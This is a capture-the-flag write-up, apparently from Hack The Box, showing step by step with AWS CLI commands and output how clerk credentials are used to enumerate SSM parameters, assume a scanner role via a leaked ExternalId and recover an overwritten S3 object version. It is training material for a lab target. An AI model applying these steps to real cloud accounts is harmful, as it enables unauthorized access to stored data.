![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>False Ferry</font>

22<sup>nd</sup> June 2026

Prepared By: `kangwijen`

Challenge Author(s): `kangwijen`

Difficulty: <font color='green'>Very Easy</font>

<br><br>

# Synopsis

False Ferry is a Very Easy Cloud Exploitation challenge that demonstrates SSM parameter enumeration through ExternalId-scoped IAM role assumption and S3 object version recovery to reconstruct a manifest record after its live object key had already been overwritten.

## Description

Lysa Harrowmere reaches the lower city ferry piers while Stormbound soldiers wait for the morning boat. They are supposed to cross the river and guard the east road before Vaultrune's next patrol moves through. The route board says the boat goes to the east road landing, but the crew roster sends it to a dock controlled by Vaultrune. If Lysa warns the soldiers openly, Vaultrune's men can claim she started a fight at the pier. If she confronts the ferry master, his guards can tear down the roster and post the correct one. Lysa has one job: find the earlier crossing list, prove who changed the dock, and get the soldiers onto the right boat before Vaultrune cuts the road.

## Skills Required

- AWS CLI basics
- IAM and STS role assumption with `ExternalId`
- SSM parameter listing and JSON inspection

## Skills Learned

- Correlating SSM crossing parameters to the live crossing chain
- Using `sts:AssumeRole` with an `ExternalId` from a crossing document
- Recovering sealed data from prior S3 object versions

# Enumeration

Every player starts with clerk-level credentials from the briefing page and the AWS endpoint from the instance card. Export both before running anything else, since every command below depends on them. The `<AWS_PORT>` is the AWS API port from the instance card, not the briefing website port:

```bash
$ export AWS_ENDPOINT_URL=http://<CHALLENGE_IP>:<AWS_PORT>
$ export AWS_DEFAULT_REGION=us-east-1
$ export AWS_ACCESS_KEY_ID=<from briefing>
$ export AWS_SECRET_ACCESS_KEY=<from briefing>
$ unset AWS_SESSION_TOKEN
```

With those set, every `aws` call routes to the challenge endpoint automatically. A quick identity check is the natural first move before enumerating anything else:

```bash
$ aws sts get-caller-identity

{
    "UserId": "AIDA57V7FOKN03H83IH3",
    "Account": "584729103648",
    "Arn": "arn:aws:iam::584729103648:user/coalition-ferry-clerk"
}
```

# Solution

## Exploitation

### Finding the crossing parameters

Listing SSM parameters is one of the way to map out what a clerk identity can see, and the account context points directly at the `/ferry/crossing/` namespace:

```bash
$ aws ssm describe-parameters --output text

PARAMETERS      text    2026-07-14T13:59:38.212000+07:00   /ferry/crossing/live-crossing-id       String  1
PARAMETERS      text    2026-07-14T13:59:38.223000+07:00   /ferry/crossing/CROSSING-VOID-9B11     String  1
PARAMETERS      text    2026-07-14T13:59:38.235000+07:00   /ferry/crossing/CROSSING-CLOSED-5E22   String  1
PARAMETERS      text    2026-07-14T13:59:38.239000+07:00   /ferry/crossing/CROSSING-DRAFT-8D40    String  1
PARAMETERS      text    2026-07-14T13:59:38.227000+07:00   /ferry/crossing/CROSSING-VOID-3C21     String  1
PARAMETERS      text    2026-07-14T13:59:38.219000+07:00   /ferry/crossing/CROSSING-7A3F          String  1
PARAMETERS      text    2026-07-14T13:59:38.231000+07:00   /ferry/crossing/CROSSING-VOID-1A04     String  1
PARAMETERS      text    2026-07-14T13:59:38.242000+07:00   /ferry/crossing/CROSSING-VOID-2D77     String  1
```

Eight parameters come back: seven crossing IDs and one pointer named `live-crossing-id`. The suffixes on most of the crossing IDs give away their status without opening a single one: VOID, CLOSED, and DRAFT read as dead-record markers, ruling out five of the seven. `CROSSING-7A3F` is the only crossing ID left with no such suffix. Reading the pointer directly is what actually confirms it:

```bash
$ aws ssm get-parameter --name /ferry/crossing/live-crossing-id --output text

PARAMETER   arn:aws:ssm:us-east-1:584729103648:parameter/ferry/crossing/live-crossing-id  text    2026-07-14T13:59:38.212000+07:00   /ferry/crossing/live-crossing-id   String  CROSSING-7A3F   1
```

The pointer resolves to `CROSSING-7A3F`, the same parameter that carried no VOID, CLOSED, or DRAFT suffix. The pointer value and the suffix pattern now agree, confirmed by an actual read rather than the suffix alone.

### Reading the live crossing record

The pointer only gave a name, not the content behind it, so pulling the full parameter is next:

```bash
$ aws ssm get-parameter --name /ferry/crossing/CROSSING-7A3F --query 'Parameter.Value' --output text

{
  "crossing_id": "CROSSING-7A3F",
  "status": "AUTHORIZED",
  "issuer": "stormbound-coalition-ferry-office",
  "scanner_role_arn": "arn:aws:iam::584729103648:role/ferry-crossing-scanner",
  "scanner_external_id": "ferry-crossing-scanner-7a3f",
  "manifest_bucket": "ferry-crossing-manifest",
  "manifest_object_key": "manifests/morning-crossing-order.txt",
  "manifest_version_id": "08a2d8c7-e217-4694-ad13-2f379e87cfc2",
  "record_type": "crossing_manifest"
}
```

This one document hands over the rest of the chain: a role ARN to assume, an `ExternalId` that role's trust policy checks, an S3 bucket and key holding the manifest, and a specific version ID inside that key's history. The `status: AUTHORIZED` field also matches the pointer result, confirming this is the record that matters rather than one of the VOID or CLOSED entries.

Testing whether the clerk identity can read that S3 version directly is a quick check before assuming the scanner role is even necessary:

```bash
$ aws s3api get-object --bucket ferry-crossing-manifest \
  --key manifests/morning-crossing-order.txt \
  --version-id 08a2d8c7-e217-4694-ad13-2f379e87cfc2 \
  /tmp/test.txt

An error occurred (AccessDenied) when calling the GetObject operation: User is not authorized to perform: s3:GetObjectVersion
```

Denied. The clerk can read parameters and assume roles, but versioned object history sits behind a permission the clerk does not have. That is exactly what `scanner_role_arn` in the crossing document is there for.

### Assuming the scanner role

The crossing document already supplied the role ARN and the `ExternalId` its trust policy expects, so assuming it is a direct plug-in of values already in hand:

```bash
$ aws sts assume-role \
  --role-arn arn:aws:iam::584729103648:role/ferry-crossing-scanner \
  --role-session-name ferry-check \
  --external-id ferry-crossing-scanner-7a3f

{
    "Credentials": {
        "AccessKeyId": "<SCANNER_ACCESS_KEY_ID>",
        "SecretAccessKey": "<SCANNER_SECRET_ACCESS_KEY>",
        "SessionToken": "<SCANNER_SESSION_TOKEN>",
        "Expiration": "2026-07-14T08:02:55.424753+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAQB1751E32W6IHT4X:ferry-check",
        "Arn": "arn:aws:sts::584729103648:assumed-role/ferry-crossing-scanner/ferry-check"
    },
    "PackedPolicySize": 0
}
```

It succeeds because the `ExternalId` came from the live crossing document. Trying an ExternalId lifted from one of the VOID or CLOSED parameters would fail the trust policy check before the role is ever assumed. Export the scanner session credentials and confirm the new identity before doing anything else:

```bash
$ export AWS_ACCESS_KEY_ID=<SCANNER_ACCESS_KEY_ID>
$ export AWS_SECRET_ACCESS_KEY=<SCANNER_SECRET_ACCESS_KEY>
$ export AWS_SESSION_TOKEN=<SCANNER_SESSION_TOKEN>

$ aws sts get-caller-identity

{
    "UserId": "AROAQB1751E32W6IHT4X:ferry-check",
    "Account": "584729103648",
    "Arn": "arn:aws:sts::584729103648:assumed-role/ferry-crossing-scanner/ferry-check"
}
```

### Recovering the sealed manifest

Holding the scanner role now, listing every version of the manifest object is the next step, since the target is a specific version tied to `CROSSING-7A3F`, not whatever the key currently returns on a plain read:

```bash
$ aws s3api list-object-versions \
  --bucket ferry-crossing-manifest \
  --prefix manifests/morning-crossing-order.txt

{
    "Versions": [
        {
            "VersionId": "a0b8db1d-4177-4473-a527-9600f94d778b",
            "IsLatest": true,
            "Size": 129,
            "LastModified": "2026-07-14T06:59:38+00:00"
        },
        {
            "VersionId": "ffbfbc78-e622-4054-b9a5-5ac89cab59e5",
            "IsLatest": false,
            "Size": 99,
            "LastModified": "2026-07-14T06:59:38+00:00"
        },
        {
            "VersionId": "08a2d8c7-e217-4694-ad13-2f379e87cfc2",
            "IsLatest": false,
            "Size": 124,
            "LastModified": "2026-07-14T06:59:38+00:00"
        }
    ],
    "Prefix": "manifests/morning-crossing-order.txt"
}
```

Three versions exist on this key, and the one marked `IsLatest: true` is not the version ID the crossing document named. Reading the current object shows why that distinction matters:

```bash
$ aws s3api get-object --bucket ferry-crossing-manifest \
  --key manifests/morning-crossing-order.txt \
  --version-id a0b8db1d-4177-4473-a527-9600f94d778b \
  /tmp/desk-manifest.txt
$ cat /tmp/desk-manifest.txt

CROSSING AUTHORIZATION
Batch: CROSSING-VOID-9B11
Status: RELEASED
Effective: 2026-06-15
Reference: emergency-release ED-2026-014
```

The current object body authorizes `CROSSING-VOID-9B11`, one of the parameters already ruled out during enumeration. Someone overwrote this key after the sealed record was written, so a plain read of `manifests/morning-crossing-order.txt` returns content with no real connection to `CROSSING-7A3F` at all.

Retrieving version `08a2d8c7-e217-4694-ad13-2f379e87cfc2` yields the correct manifest:

```bash
$ aws s3api get-object --bucket ferry-crossing-manifest \
  --key manifests/morning-crossing-order.txt \
  --version-id 08a2d8c7-e217-4694-ad13-2f379e87cfc2 \
  /tmp/sealed-manifest.txt
$ cat /tmp/sealed-manifest.txt

CROSSING RELEASE RECORD
Batch: CROSSING-7A3F
Authorized by: Stormbound Coalition Ferry Office
HTB{REDACTED}
```

That version's body references `CROSSING-7A3F`, the crossing ID verified live in the first step, and it carries the flag.

### Getting the flag

1. List SSM parameters under `/ferry/crossing/` and separate the pointer parameter from crossing IDs carrying VOID, CLOSED, or DRAFT suffixes.
2. Resolve `live-crossing-id` to `CROSSING-7A3F`.
3. Read the `CROSSING-7A3F` parameter and pull out `scanner_role_arn`, `scanner_external_id`, `manifest_bucket`, `manifest_object_key`, and `manifest_version_id`.
4. Confirm a direct versioned read fails for the clerk identity, then assume `ferry-crossing-scanner` using the `ExternalId` from the crossing document.
5. List object versions on the manifest key and notice that the current version does not match the crossing document's `manifest_version_id`.
6. Fetch the object at the version ID named in the crossing document to recover the sealed record and the flag.

Answer: `HTB{REDACTED}`
